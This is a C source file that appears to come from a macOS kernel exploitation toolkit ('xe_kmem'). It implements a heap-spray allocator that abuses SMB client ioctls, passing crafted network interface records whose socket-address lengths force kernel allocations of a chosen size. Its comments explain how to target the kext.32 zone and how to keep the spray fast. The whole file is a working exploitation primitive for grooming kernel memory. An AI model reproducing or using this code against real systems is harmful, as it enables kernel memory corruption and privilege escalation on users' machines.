//
//  allocator_nrnw.c
//  xe_kmem
//
//  Created by admin on 2/22/22.
//

#include <stdatomic.h>
#include <xe/util/assert.h>

#include "allocator_nrnw.h"
#include "../smb/client.h"


struct xe_allocator_nrnw {
    int fd;
    _Atomic uint32_t keygen;
};

xe_allocator_nrnw_t xe_allocator_nrnw_create(const struct sockaddr_in* smb_addr) {
    int fd = smb_client_open_dev();
    xe_assert(fd >= 0);
    
    int error = smb_client_ioc_negotiate(fd, smb_addr, sizeof(*smb_addr), TRUE);
    xe_assert_err(error);
    
    struct xe_allocator_nrnw* allocator = malloc(sizeof(struct xe_allocator_nrnw));
    allocator->fd = fd;
    allocator->keygen = 0;
    
    return allocator;
}

void xe_allocator_nrnw_allocate(xe_allocator_nrnw_t allocator, size_t alloc_size, size_t num_allocs) {
    xe_assert_cond(alloc_size, <=, 256);
    xe_assert_cond(num_allocs, <=, UINT32_MAX);
    
    /// With every allocation of a socket address, an allocation of type `struct sock_addr_entry` is
    /// also done. The size of `struct sock_addr_entry` is 24 bytes, which will end up in kext.32 zone
    /// So we need to make only `num_allocs / 2` to get `num_allocs` allocations in kext.32 zone
    if (alloc_size > 16 && alloc_size <= 32) {
        num_allocs = (num_allocs + 1) / 2;
    }
    
    size_t info_size = offsetof(struct network_nic_info, addr) + sizeof(struct sockaddr_in);
    size_t infos_size = info_size * num_allocs + alloc_size;
    
    struct network_nic_info* infos = malloc(infos_size);
    bzero(infos, infos_size);
    
    struct network_nic_info* cursor = infos;
    for (int i=0; i<num_allocs; i++) {
        uint32_t idx = atomic_fetch_add(&allocator->keygen, 1);
        /// Each NIC stores the list of associated socket addresses in a linked list. When a socket address
        /// is added to the NIC, it is compared with all the existing socket address to avoid duplicates. As the
        /// size of linked list grows, associating new socket address with NIC will become slow. To avoid this
        /// we will associate only upto 1024 IP addresses per NIC
        cursor->nic_index = idx / 1024;
        cursor->next_offset = (uint32_t)info_size;
        cursor->addr_4.sin_len = alloc_size;
        cursor->addr_4.sin_family = ALLOCATOR_NRNW_SOCK_ADDR_FAMILY;
        /// Socket address with same IP address are not allowed in the same NIC (they will be ignored)
        cursor->addr_4.sin_addr.s_addr = idx;
        cursor->addr_4.sin_port = ALLOCATOR_NRNW_SOCK_ADDR_PORT;
        
        cursor = (struct network_nic_info*)((char*)cursor + info_size);
    }
    
    int error = smb_client_ioc_update_client_interface(allocator->fd, infos, num_allocs);
    xe_assert_err(error);
    free(infos);
}

void xe_allocator_nrnw_destroy(xe_allocator_nrnw_t* allocator_p) {
    xe_allocator_nrnw_t allocator = *allocator_p;
    close(allocator->fd);
    free(allocator);
    *allocator_p = NULL;
}
